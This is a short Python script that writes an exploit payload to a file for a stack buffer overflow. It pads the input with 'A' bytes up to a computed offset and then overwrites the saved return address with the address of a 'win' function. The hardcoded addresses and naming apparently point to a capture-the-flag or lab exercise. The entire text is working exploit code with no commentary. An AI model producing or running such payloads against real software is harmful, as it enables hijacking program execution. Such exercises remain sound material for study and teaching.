import struct
rip = 0x7fffffffd968
buffer = 0x7fffffffd8e0
offset = rip - buffer
win = 0x401236

open("payload.bin","wb").write(b"A"*offset + struct.pack("<Q", win))